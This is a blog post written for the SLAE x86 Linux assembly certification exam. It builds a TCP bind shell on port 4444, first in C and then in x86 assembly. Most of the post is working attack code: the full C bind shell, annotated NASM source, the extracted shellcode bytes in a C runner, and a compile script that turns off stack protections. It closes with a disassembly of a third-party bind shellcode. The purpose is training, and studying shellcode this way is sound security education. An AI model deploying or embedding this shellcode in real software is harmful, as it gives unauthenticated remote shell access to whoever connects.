---
layout: post
title: "SLAE x86 Exam Part 1"
description: "SLAE x86 Exam Part 1: Bind Shell"
modified: 2018-05-24T14:14:00-05:00
tags: [pentest, asm, x86, slae]
---


# Overview
This blog post has been created for completing the requirements of the 
SecurityTube Linux Assembly Expert certification: 

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](/http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1260

---

This post documents my efforts to complete the first exercise in the SLAE exam: 
creating a Bind shell in x86 ASM. Regardless of language or architecture, Bind 
shells follow roughly the same format:

 1. Create a socket
 2. Bind the socket to an address
 3. Listen for incoming connections
 4. Accept a connection
 5. Duplicate file descriptors
 6. Call executable

## C Implementation 

Since I was largely unfamiliar with both programming in assembly and 
interacting with the networking stack at this low level, I decided to first
implement this challenge in C, using a Socket Programming lesson[^1] from CMU's 
15-441 Computer Networks as a guide.

Note: This implementation contains exactly zero error checking.  

### Socket creation 
According to `man 2 socket`, socket declaration in C looks like this:
{% highlight c %}
int socket(int domain, int type, int protocol);
{% endhighlight %}

For our purposes, 'domain' will be `AF_INET` and 'type' will be `SOCK_STREAM`.
'Protocol' will be `0`.  The `int` returned by the `socket()` constructor is a 
file descriptor for the newly-created socket, which will be used when binding,
listening for and accepting connections.  

### Socket Bind 
Having created a socket and stored its file descriptor, we must now bind that
socket to an address.  This address will be represented by a `sockaddr_in` 
struct, defined [^2] as follows:
{% highlight c %}
struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};
{% endhighlight %}
(Source: `man 7 ip`)

For this exercise we want to accept a connection on any address, so we'll use
`INADDR_ANY` (`0`) for s_addr.  The port to which we will bind is set in the 
`#define` at the beginning of the file, and the address family should match 
what was declared during the initial socket construction.  

### Listen 
The next step after binding our socket to an address is to listen for incoming
connections. We accomplish this by calling `listen()`:
{% highlight c %}
int listen(int sockfd, int backlog);
{% endhighlight %}
(Source: `man 2 listen`)

The second argument, `backlog`, refers to the number of pending connections
that can be queued.  Any outstanding connection attempts beyond this number 
will receive an `ECONNREFUSED` response.

The `sockfd` argument, of course, is the same socket we've used previously. 

### Accept 
In order for our listening socket to be of any use, we must next define what 
should happen when a connection is established using the `accept()` function:
{% highlight c %}
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
{% endhighlight %}
(Source: `man 2 accept`)

It took some testing to wrap my head around this part.  If the `sockaddr_in` 
passed to this function is not null, this function populates it with the 
connected client's information.  The int returned by `accept()` is the file
descriptor for a new socket.  

### Dup FD 
In the next step, we duplicate the new socket's file descriptor to `stdin`, 
`stdout`, and `stderr` using `dup2()`:
{% highlight c %}
for (int i = 2; i >= 0; i--) dup2(bind_fd, i);
{% endhighlight %}

### Exec 
With our connection established, all that remains is to execute the shell:
{% highlight c %}
execl("/bin/sh", NULL, NULL);
{% endhighlight %}

### Clean Up 
Finally, we must clean up after ourselves by closing the two sockets:
{% highlight c %}
close(sock_fd);
close(bind_fd);
{% endhighlight %}

### Conclusion 
I had a ton of fun with this part of the exercise, and learned a ton about 
sockets and their implementation in Linux.  Here is the code for this section
in its entirety:
{% highlight c %}
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 4444

int sock_fd, bind_fd;
struct sockaddr_in s_addr, d_addr;

int main(int argc, char **argv) {
    // Create a TCP socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    // Initialize sockaddr_in struct
    s_addr.sin_family = AF_INET;
    s_addr.sin_port = htons(PORT);
    s_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind to any local address on the specified port and listen
    bind(sock_fd, (struct sockaddr *) &s_addr, sizeof(s_addr));

    // Listen for connections with a queue size of 1
    listen(sock_fd, 1);

    // Accept a connection
    socklen_t d_addr_len = sizeof(d_addr);
    bind_fd = accept(sock_fd, (struct sockaddr *) &d_addr, &d_addr_len);

    // Duplicate stdin/out/err file descriptors
    for (int i = 2; i >= 0; i--) dup2(bind_fd, i);

    // Execute shell
    execl("/bin/sh", NULL, NULL);
    close(sock_fd);
    close(bind_fd);

    return 0;
}
{% endhighlight %}

[Screenshot of compilation and execution]

Next, I used the C code as the basis for an ASM implementation.

## ASM Implementation 
The same sequence of `socket -> bind -> listen -> accept` applies here, and we
will use roughly the same formula to execute each of these steps using the 
`SOCKETCALL` syscall:
 - Syscall -> EAX
 - Function -> EBX
 - Push args onto stack
 - ESP (ptr to args) -> ECX
 - Trigger interrupt

### Socket Creation 
To begin, we must ensure our registers are in a consistent state:
{% highlight nasm %}
xor ebx, ebx
mul ebx
{% endhighlight %}

The first operation clears EBX, and the second multiplies EAX with EBX, placing 
the the result in EDX:EAX, effectively zeroing out both registers.  We then
move the entry point for the `SOCKETCALL` syscall into EAX, and save it in EDI 
for future use:
{% highlight nasm %}
mov al, 0x66
mov edi, eax
{% endhighlight %}

Next, we place our `socket()` arguments onto the stack, and store a pointer
to them in ECX:
{% highlight nasm %}
push edx
push 0x1
push 0x2
mov ecx, esp
{% endhighlight %}

Finally, we execute creation of the socket and store the returned file 
descriptor in esi:
{% highlight nasm %}
int 0x80
xchg esi, eax
{% endhighlight %}

### Socket Bind 
Binding the socket looks pretty similar: set the syscall, change the function 
to 2 (SYS_BIND), push our arguments onto the stack, and execute.  The only 
challenge here is building the sockaddr_in struct.  I'm sure there's a more
idiomatic way to do this, but I combined the struct's 3 values (short sin_addr,
unsigned short sin_port, and unsigned long sin_addr) in ECX before pushing them
onto the stack.  
{% highlight nasm %}
mov eax, edi
inc ebx

push edx
mov cx, 0x5C11
shl ecx, 0x10
or cl, 0x2
push ecx
mov ecx, esp

push 0x10
push ecx
push esi
mov ecx, esp

int 0x80
{% endhighlight %}

### Listen 
Setting up `listen()` was also straightforward; the only oddity here is
shifting EBX from 2 to 4 to avoid two calls to `inc ebx`. 
{% highlight nasm %}
mov eax, edi
shl ebx, 0x1

push byte 0x1
push esi
mov ecx, esp

int 0x80
{% endhighlight %}

### Accept 
When we call `accept()`, we don't really care about the remote address, so 
we'll set its sockaddr_in and sizeof() arguments to `NULL`. 
{% highlight nasm %}
mov eax, edi
inc ebx

push dword edx
push esi
mov ecx, esp

int 0x80
{% endhighlight %}

### Dup FD 
Binding the file descriptors takes the form of a simple INC/CMP/JMP loop:
{% highlight nasm %}
xchg eax, ebx
xor ecx, ecx

dup_loop:
    mov al, 0x3f
    int 0x80
    inc ecx
    cmp cl, 0x3
    jle dup_loop
{% endhighlight %}

### Exec 
Finally, we'll execute "/bin/sh" using the EXECVE syscall:
{% highlight nasm %}
push edx
push 0x68732F2F
push 0x6E69622F
mov ebx, esp
xor eax, eax
mov al, 0xB
xor ecx, ecx
int 0x80
{% endhighlight %}

### bindshell.nasm
{% highlight nasm %}
global _start

section .text
_start:
    ; sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    xor ebx, ebx    ; Clear EBX
    mul ebx         ; Multiply EAX * 0, also clears EDX
    mov al, 0x66    ; SOCKETCALL syscall
    mov edi, eax    ; Save syscall for future use

    inc ebx         ; SYS_SOCKET (1)

    push edx        ; SYS_SOCKET arg: PROTOCOL
    push 0x1        ; SYS_SOCKET arg: SOCK_STREAM
    push 0x2        ; SYS_SOCKET arg: AF_INET
    mov ecx, esp    ; Point ECX to syscall args

    int 0x80        ; Execute syscall
    xchg esi, eax   ; Save syscall return value

    ; bind(sock_fd, &{sin_family, sin_port, sin_addr}, sizeof(s_addr));
    mov eax, edi    ; SOCKETCALL
    inc ebx         ; SYS_BIND (2)

    push edx        ; sin_addr = INADDR_ANY (0)
    mov cx, 0x5C11  ; sin_port = 4444
    shl ecx, 0x10   ; ECX -> 0x5C110000
    or cl, 0x2      ; ECX -> 0x5C110002
    push ecx        ; Push sockaddr struct
    mov ecx, esp    ; Move pointer to struct sockaddr into ECX

    push 0x10       ; sockaddr_in length: short + unsigned short + unsigned long + char[8] = 16 bytes
    push ecx        ; Pointer to new sockaddr_in struct
    push esi        ; Old socket FD
    mov ecx, esp    ; Move argument pointer to ECX

    int 0x80        ; Execute syscall

    ; listen(sock_fd, 1);
    mov eax, edi    ; SOCKETCALL
    shl ebx, 0x1    ; SYS_LISTEN (2 -> 4)

    push byte 0x1   ; Queue size
    push esi        ; sock_fd pointer
    mov ecx, esp    ; Args -> ECX

    int 0x80        ; Execute syscall

    ; bind_fd = accept(sock_fd, &{sin_family, sin_port, sin_addr}, sizeof(d_addr));
    mov eax, edi    ; SOCKETCALL
    inc ebx         ; SYS_ACCEPT (5)

    push dword edx  ; d_addr, sizeof(d_addr) = NULL
    push esi        ; sock_fd pointer
    mov ecx, esp    ; SYS_ACCEPT args -> ECX

    int 0x80        ; Execute syscall

    ; for (int i = 2; i >= 0; i--) dup2(bind_fd, i);
    xchg eax, ebx   ; SYS_ACCEPT returns new sock_fd in EAX; move to EBX
    xor ecx, ecx    ; Clear ECX

dup_loop:
    mov al, 0x3f    ; dup2 syscall
    int 0x80        ; Execute syscall
    inc ecx
    cmp cl, 0x3
    jle dup_loop

    ; execl("/bin/sh", NULL, NULL);
    push edx        ; null terminate
    push 0x68732F2F ; hs//
    push 0x6E69622F ; nib/
    mov ebx, esp    ; Load executable path into EBX
    xor eax, eax    ; Clear EAX
    mov al, 0xB     ; EXECVE syscall
    xor ecx, ecx    ; Clear ECX
    int 0x80
{% endhighlight %}

### shellcode.c
{% highlight c %}
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
    "\x31\xdb\xf7\xe3\xb0\x66\x89\xc7\x43\x52\x6a\x01"
    "\x6a\x02\x89\xe1\xcd\x80\x96\x89\xf8\x43\x52\x66"
    "\xb9\x11\x5c\xc1\xe1\x10\x80\xc9\x02\x51\x89\xe1"
    "\x6a\x10\x51\x56\x89\xe1\xcd\x80\x89\xf8\xd1\xe3"
    "\x6a\x01\x56\x89\xe1\xcd\x80\x89\xf8\x43\x52\x56"
    "\x89\xe1\xcd\x80\x93\x31\xc9\xb0\x3f\xcd\x80\x41"
    "\x80\xf9\x03\x7e\xf6\x52\x68\x2f\x2f\x73\x68\x68"
    "\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\x31\xc9"
    "\xcd\x80";

int main (int argc, char **argv) {
    printf("Shellcode Length:  %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())shellcode;
    ret();
}
{% endhighlight %}

## Compiling
To help with changing the port and recompiling both the C and ASM
implementations, I've written a script that accepts the new port as a command
line argument:

{% highlight bash %}
#!/bin/bash

# SLAE x86 Exam #1: Bind Shell
#
# compile.sh: Update port if specified, then compile ${NAME}.nasm,
# ${NAME}.c, and shellcode.c.
#
# Author: Kerry Milan
#         SLAE-1260
#         me@kerrymilan.com
#
# Usage: ./compile.sh [port] (optional)

ROOT=$(dirname $(readlink -f $0))
NAME="bindshell"

if [ ! -z $1 ]; then
    if [ $1 -lt 0  -o  $1 -gt 65535 ]; then
        echo "Invalid port specified: ${1}"
        exit 1
    fi

    PORT_INT=${1}
    PORT_HEX=$(printf "%04x0x" ${PORT_INT} | tac -rs .. | tr -d '\n')

    echo " [+] Updating port: ${PORT_INT} (${PORT_HEX})"
    sed -ri "s/^#define PORT [0-9]+\s*$/#define PORT ${PORT_INT}/" ${ROOT}/${NAME}.c
    sed -ri "s/0x[0-F]+\s+;\s*sin_port\s*$/${PORT_HEX}  ; sin_port/" ${ROOT}/${NAME}.nasm

    echo ${PORT_HEX:2:4} | egrep -q "(^00)|(00$)"
    [ $? -eq 0 ] && echo " [-] WARNING: This port introduces null chars into shellcode"

fi

echo -n " [+] Compiling ${NAME}.c..."
/usr/bin/gcc -ggdb3 -o ${ROOT}/${NAME}_c ${ROOT}/${NAME}.c > /dev/null 2>&1
[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Compiling ${NAME}.nasm..."
/usr/bin/nasm -f elf32 ${ROOT}/${NAME}.nasm > /dev/null 2>&1
[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Linking ${NAME}.o..."
/usr/bin/ld ${ROOT}/${NAME}.o -o ${ROOT}/${NAME} > /dev/null 2>&1
[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Generating shellcode from ${NAME}..."
SHELLCODE=$(/usr/bin/objdump -D ${ROOT}/${NAME} \
            | egrep ":\s+([0-f]{2}\s)+" -o \
            | sed -r "s/^:\s+//g" \
            | sed -r "s/([0-f]{2})/\\\x\1/g" | tr -d "\n " \
            | fold -w 48 \
            | sed -r "s/(^.*$)/    \"\1\"/g"; \
            echo ";")

[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Building shellcode.c..."
cat > ${ROOT}/shellcode.c << EOF
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
${SHELLCODE}

int main (int argc, char **argv) {
    printf("Shellcode Length:  %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
EOF
[ $? -eq 0 ] && echo "Done" || echo "ERROR"

echo -n " [+] Compiling shellcode.c..."
/usr/bin/gcc -ggdb3 -z execstack -fno-stack-protector \
        -o ${ROOT}/shellcode ${ROOT}/shellcode.c > /dev/null 2>&1
[ $? -eq 0 ] && echo "Done" || echo "ERROR"
{% endhighlight %}

# Comparison
Once I was finished, I wanted to see how the product of my efforts compared to 
an established solution.  I downloaded an example bindshell written by Geyslan
G. Bem from shell-storm.org [^3].  His implementation is 57 bytes in length and
differs from mine in that it binds to a random port.  

Since the author's website is now defunct and the shell-storm page included 
only the shellcode, I had to convert the assembly with objdump and figure out 
what it was doing myself.  Here is my analysis:

{% highlight nasm %}
31 db            xor    ebx,ebx    ; Clear ebx
f7 e3            mul    ebx        ; Also clear eax and edx

b0 66            mov    al,0x66    ; Set syscall instr
43               inc    ebx        ; socket function
52               push   edx        ; 0 (proto)
53               push   ebx        ; 1 (sock_stream)
6a 02            push   0x2        ; 2 (af_inet)
89 e1            mov    ecx,esp    ; arg pointer
cd 80            int    0x80       ; interrupt

52               push   edx        ; 0 (inaddr_any)
50               push   eax        ; file descriptor
89 e1            mov    ecx,esp    ; arg
b0 66            mov    al,0x66    ; socketcall
b3 04            mov    bl,0x4     ; listen function
cd 80            int    0x80       ; interrupt

b0 66            mov    al,0x66    ; socketcall
43               inc    ebx        ; accept function
cd 80            int    0x80       ; interrupt

59               pop    ecx        ; fd -> ecx
93               xchg   ebx,eax    ; new fd -> ebx
6a 3f            push   0x3f       ; dup2 syscall
58               pop    eax        ; syscall -> eax
cd 80            int    0x80       ; interrupt

49               dec    ecx        ; -> 1
79 f8            jns    2060       ; loop
b0 0b            mov    al,0xb     ; execve
68 2f 2f 73 68   push   0x68732f2f ; String: hs//
68 2f 62 69 6e   push   0x6e69622f ; String: nib/
89 e3            mov    ebx,esp    ; load arg
41               inc    ecx        ; inc counter
cd 80            int    0x80       ; interrupt
{% endhighlight %}

## Screenshots
![Execution of C implementation]({{ "/assets/images/1.1-bindshell_c.png" | absolute_url}})
![Execution of NASM implementation]({{ "/assets/images/1.2-bindshell.png" | absolute_url}})

# References
[^1]: https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf
[^2]: https://www.gta.ufrj.br/ensino/eel878/sockets/sockaddr_inman.html
[^3]: http://shell-storm.org/shellcode/files/shellcode-837.php
